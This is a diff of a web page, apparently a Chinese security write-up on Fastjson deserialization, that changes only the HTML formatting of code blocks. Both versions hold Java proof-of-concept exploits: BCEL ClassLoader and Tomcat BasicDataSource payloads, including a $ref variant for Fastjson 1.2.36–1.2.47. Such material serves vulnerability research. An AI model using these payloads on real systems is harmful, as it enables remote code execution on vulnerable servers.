-            <span class="n">String</span> <span class="n">poc</span> <span class="o">=</span> <span class="s">&#34;{{\&#34;aaa\&#34;: {\&#34;@type\&#34;: \&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&#34;,\&#34;driverClassLoader\&#34;: {\&#34;@type\&#34;: \&#34;com.sun.org.apache.bcel.internal.util.ClassLoader\&#34;},\&#34;driverClassName\&#34;: \&#34;$$BCEL$$&#34;</span><span class="o">+</span> <span class="n">code</span><span class="o">+</span> <span class="s">&#34;\&#34;}}: \&#34;bbb\&#34;}&#34;</span><span class="o">;</span>
-<span class="cm">/*
-</span><span class="cm">或者: （这两个都一样的）
-</span><span class="cm">&#34;{{\&#34;@type\&#34;: \&#34;com.alibaba.fastjson.JSONObject\&#34;,\&#34;aaa\&#34;: {\&#34;@type\&#34;: \&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&#34;,\&#34;driverClassLoader\&#34;: {\&#34;@type\&#34;: \&#34;com.sun.org.apache.bcel.internal.util.ClassLoader\&#34;},\&#34;driverClassName\&#34;: \&#34;$$BCEL$$&#34;+ code+ &#34;\&#34;}}:\&#34;bbb\&#34;}&#34;
-</span><span class="cm">*/</span>
-            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">poc</span><span class="o">);</span>
-            <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">poc</span><span class="o">);</span>
-        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.Repository</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.classfile.JavaClass</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.classfile.Utility</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">JavaClass</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">Repository</span><span class="o">.</span><span class="na">lookupClass</span><span class="o">(</span><span class="n">test</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Utility</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">cls</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="kc">true</span><span class="o">);</span><span class="c1">//转换为字节码并编码为bcel字节码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">poc</span> <span class="o">=</span> <span class="s">&#34;{{\&#34;aaa\&#34;: {\&#34;@type\&#34;: \&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&#34;,\&#34;driverClassLoader\&#34;: {\&#34;@type\&#34;: \&#34;com.sun.org.apache.bcel.internal.util.ClassLoader\&#34;},\&#34;driverClassName\&#34;: \&#34;$$BCEL$$&#34;</span><span class="o">+</span> <span class="n">code</span><span class="o">+</span> <span class="s">&#34;\&#34;}}: \&#34;bbb\&#34;}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm">或者: （这两个都一样的）
+</span></span></span><span class="line"><span class="cl"><span class="cm">&#34;{{\&#34;@type\&#34;: \&#34;com.alibaba.fastjson.JSONObject\&#34;,\&#34;aaa\&#34;: {\&#34;@type\&#34;: \&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&#34;,\&#34;driverClassLoader\&#34;: {\&#34;@type\&#34;: \&#34;com.sun.org.apache.bcel.internal.util.ClassLoader\&#34;},\&#34;driverClassName\&#34;: \&#34;$$BCEL$$&#34;+ code+ &#34;\&#34;}}:\&#34;bbb\&#34;}&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
+</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">poc</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">JSON</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">poc</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>注意: tomcat7使用的类是<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>，而在8版本以后名为<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p>
 <h3 id="1236--fastjson--1247"><a href="#1236--fastjson--1247" class="anchor-link">#</a><a href="#contents:1236--fastjson--1247" class="headings">1.2.36 ≤ FastJson ≤ 1.2.47</a></h3>
@@ -934,31 +934,31 @@
 </span><span class="lnt">24
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
-
-<span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.Repository</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.classfile.JavaClass</span><span class="o">;</span>
-<span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.classfile.Utility</span><span class="o">;</span>
-
-<span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
-    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
-        <span class="k">try</span><span class="o">{</span>
-            <span class="n">JavaClass</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">Repository</span><span class="o">.</span><span class="na">lookupClass</span><span class="o">(</span><span class="n">test</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
-            <span class="n">String</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Utility</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">cls</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="kc">true</span><span class="o">);</span><span class="c1">//转换为字节码并编码为bcel字节码
-</span><span class="c1"></span>
-            <span class="n">String</span> <span class="n">poc</span> <span class="o">=</span> <span class="s">&#34;{\&#34;name\&#34;:{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&#34;},\&#34;x\&#34;:{\&#34;name\&#34;: {\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;com.sun.org.apache.bcel.internal.util.ClassLoader\&#34;},\&#34;y\&#34;: \n&#34;</span> <span class="o">+</span>
-                    <span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.alibaba.fastjson.JSONObject\&#34;,\&#34;c\&#34;: {\&#34;@type\&#34;:\&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&#34;,\&#34;driverClassLoader\&#34;: {\&#34;@type\&#34;:\&#34;com.sun.org.apache.bcel.internal.util.ClassLoader\&#34;},\n&#34;</span> <span class="o">+</span>
-                    <span class="s">&#34;\&#34;driverClassName\&#34;:\&#34;$$BCEL$$&#34;</span><span class="o">+</span><span class="n">code</span><span class="o">+</span><span class="s">&#34;\&#34;,\&#34;$ref\&#34;:\&#34;$.x.y.c.connection\&#34;}}}}&#34;</span><span class="o">;</span>
-            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">poc</span><span class="o">);</span>
-            <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">poc</span><span class="o">);</span>
-        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
-            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
-        <span class="o">}</span>
-
-    <span class="o">}</span>
-<span class="o">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">fastjson</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.alibaba.fastjson.JSON</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.Repository</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.classfile.JavaClass</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.bcel.internal.classfile.Utility</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">JavaClass</span> <span class="n">cls</span> <span class="o">=</span> <span class="n">Repository</span><span class="o">.</span><span class="na">lookupClass</span><span class="o">(</span><span class="n">test</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">code</span> <span class="o">=</span> <span class="n">Utility</span><span class="o">.</span><span class="na">encode</span><span class="o">(</span><span class="n">cls</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(),</span> <span class="kc">true</span><span class="o">);</span><span class="c1">//转换为字节码并编码为bcel字节码
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">poc</span> <span class="o">=</span> <span class="s">&#34;{\&#34;name\&#34;:{\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&#34;},\&#34;x\&#34;:{\&#34;name\&#34;: {\&#34;@type\&#34;:\&#34;java.lang.Class\&#34;,\&#34;val\&#34;:\&#34;com.sun.org.apache.bcel.internal.util.ClassLoader\&#34;},\&#34;y\&#34;: \n&#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;{\&#34;@type\&#34;:\&#34;com.alibaba.fastjson.JSONObject\&#34;,\&#34;c\&#34;: {\&#34;@type\&#34;:\&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&#34;,\&#34;driverClassLoader\&#34;: {\&#34;@type\&#34;:\&#34;com.sun.org.apache.bcel.internal.util.ClassLoader\&#34;},\n&#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;\&#34;driverClassName\&#34;:\&#34;$$BCEL$$&#34;</span><span class="o">+</span><span class="n">code</span><span class="o">+</span><span class="s">&#34;\&#34;,\&#34;$ref\&#34;:\&#34;$.x.y.c.connection\&#34;}}}}&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">poc</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">JSON</span><span class="o">.</span><span class="na">parseObject</span><span class="o">(</span><span class="n">poc</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
 <ol>
